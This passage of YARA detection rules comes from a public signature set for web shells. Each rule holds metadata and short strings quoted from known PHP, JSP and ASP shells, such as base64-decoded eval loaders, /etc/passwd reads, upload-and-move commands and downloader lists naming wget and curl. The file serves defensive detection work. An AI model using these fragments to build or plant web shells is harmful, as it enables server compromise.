		logic_hash = "dd9f03a7ad0d2b73f7a8602ab267e0e8e5cb1f9250f9a25c86ded3797df2f8d5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_H6Ss
{
	meta:
		description = "Web Shell - file h6ss.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1177-L1190"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "272dde9a4a7265d6c139287560328cd5"
		logic_hash = "c4001be111ff271335dd65c15c59da979a8e202bcf58a7f10de7f03644472153"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval(gzuncompress(base64_decode(\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Zx
{
	meta:
		description = "Web Shell - file zx.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1191-L1204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "67627c264db1e54a4720bd6a64721674"
		logic_hash = "d97df624801d0f24141dfe7074d290a56e639af7d867c907362ff4434c3eeac0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Ani_Shell
{
	meta:
		description = "Web Shell - file Ani-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1205-L1220"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "889bfc9fbb8ee7832044fc575324d01a"
		logic_hash = "c8caf8686c36a41b5aae093e88b8872350cf625c59a14389c5df93f284c8f05a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Python_CODE = \"I"
		$s6 = "$passwordPrompt = \"\\n================================================="
		$s7 = "fputs ($sockfd ,\"\\n==============================================="

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Jsp_K8Cmd
{
	meta:
		description = "Web Shell - file k8cmd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1221-L1234"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b39544415e692a567455ff033a97a682"
		logic_hash = "e523a5b1118c6f4d5798f130c00466c7945d27a6fbe0d4cb3a40b7f36da2a502"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Cmd
{
	meta:
		description = "Web Shell - file cmd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1236-L1249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5391c4a8af1ede757ba9d28865e75853"
		logic_hash = "e48d4e2d14a3605fd9dda03630820a0fb53d893cc4d283739fde11f9ab7d9d1e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_K81
{
	meta:
		description = "Web Shell - file k81.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1251-L1265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "41efc5c71b6885add9c1d516371bd6af"
		logic_hash = "f9c6b5bec9313c6fd059055fa18332675838419bba3348bb852b50806f26ccb2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_ASP_Zehir
{
	meta:
		description = "Web Shell - file zehir.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1266-L1279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0061d800aee63ccaf41d2d62ec15985d"
		logic_hash = "90920258017cf189da128dce477e71f0040bc66aefa6f018f64db64d22f60ae5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_1
{
	meta:
		description = "Web Shell - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		old_rule_name = "webshell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1280-L1294"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "a24e7ae7c722da7f265f032315b1e8e402c2fc4a2a54a685671a9e52124f6553"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit
{
	meta:
		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1309-L1322"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "9630fc0371193bfbd0bd4fb15856477e7739fc9f11ee539d119ee837b1a54502"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Redirect
{
	meta:
		description = "Web Shell - file redirect.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1323-L1336"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "97da83c6e3efbba98df270cc70beb8f8"
		logic_hash = "b16026623fe7802db9823ad4a3dab051747eea6bd41ce72a0c8c6757bfa2c6f7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Cmdjsp
{
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1337-L1350"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "b4822e47a27c598be746ac71bf9b60dafe08d50c83a2dfee5e40ea384fcff21a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Ixrbe
{
	meta:
		description = "Web Shell - file IXRbE.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1380-L1393"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
		logic_hash = "8710d092b81c5de1e328ad6e57e5c4a25748cc92844198038c103dabc1e76e77"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_G5
{
	meta:
		description = "Web Shell - file G5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1394-L1407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "95b4a56140a650c74ed2ec36f08d757f"
		logic_hash = "2edffbea5142ef146cec57cb88b473532f56ab3e95151c5648eaeabe6a75feda"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_R57142
{
	meta:
		description = "Web Shell - file r57142.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1408-L1421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
		logic_hash = "3afa0463de3acb12480dba1b2ab9cd53fca88216ba54c5e044e48ebd84bf17bd"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Tree
{
	meta:
		description = "Web Shell - file tree.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1422-L1436"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
		logic_hash = "180aa4572a42d23f3e44589f876356ec973fd64cdd53bac69936b93699888ac2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99Madshell_V_3_0_Smowu
{
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1437-L1451"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "74e1e7c7a6798f1663efb42882b85bee"
		logic_hash = "d84a5c573b89790efdbe67a684feb7db88521027e86b7588f090696fd90cbc87"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_404
{
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1468-L1481"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "078c55ac475ab9e028f94f879f548bca"
		logic_hash = "b0524ecddf990048e3e40f471c24075c0e87654c6fe40f17dc3ff43743402e24"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Macker_S_Private_Phpshell
{
	meta:
		description = "Web Shell - file Macker's Private PHPShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1482-L1497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e24cbf0e294da9ac2117dc660d890bb9"
		logic_hash = "4bccc1aca8698e601133436a55538c08e3e1fa113a0776c04590eaf4a10fd309"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Antichat_Shell_V1_3_2
{
	meta:
		description = "Web Shell - file Antichat Shell v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1498-L1511"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "d5a1dc31f442f8db7771ee64164436f6c562ef9f4a203a1e2006d37f9df91846"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Breaker
{
	meta:
		description = "Web Shell - file Safe mode breaker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1512-L1526"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5bd07ccb1111950a5b47327946bfa194"
		logic_hash = "4adcefc05413a02653a2a405791345a1a76058a39f6e2b03765c4485f7c6b106"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Sst_Sheller
{
	meta:
		description = "Web Shell - file Sst-Sheller.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1527-L1541"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d93c62a0a042252f7531d8632511ca56"
		logic_hash = "4faac0b22fec809f2100bad200ba1f9fb9e16fab743e1b1cbfe0b80c6d2fee32"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_List
{
	meta:
		description = "Web Shell - file list.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1542-L1557"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1ea290ff4259dcaeb680cec992738eda"
		logic_hash = "5641bff0ec161fe72e502641b6138186d541ebfcbf499e0295a61f9f6f085654"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpjackal_V1_5
{
	meta:
		description = "Web Shell - file PHPJackal v1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1558-L1572"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d76dc20a4017191216a0315b7286056f"
		logic_hash = "457bc71cb8e684dafb14b1c5d2faa4366cedce5eba9545493be2b1d49daf98b6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Customize
{
	meta:
		description = "Web Shell - file customize.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1573-L1586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d55578eccad090f30f5d735b8ec530b1"
		logic_hash = "462d97427793ef6e897b33f4fd02d452ad8cd11ddef21aa25d13efc981eb3afb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_S72_Shell_V1_1_Coding
{
	meta:
		description = "Web Shell - file s72 Shell v1.1 Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1587-L1600"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "fd200d8aa347242546a1da311edc61ceebaec5f7d6b4fe2f49f069b36689f547"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Sys3
{
	meta:
		description = "Web Shell - file sys3.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1601-L1616"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
		logic_hash = "14b0ac1b1b8538b0c05dcd0a8b7129fdcad2e595ea00630bd55cee6dff596d4f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Guige02
{
	meta:
		description = "Web Shell - file guige02.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1617-L1631"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a3b8b2280c56eaab777d633535baf21d"
		logic_hash = "c214e50b209970c03d389d97673901ec44b2727e5c7588e5e4d0a644cc691423"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Ghost
{
	meta:
		description = "Web Shell - file ghost.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1632-L1647"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "38dc8383da0859dca82cf0c943dbf16d"
		logic_hash = "9a7635d313345e7b7cb7424726ed62015afd78412b504e406155f85c4cdf623f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

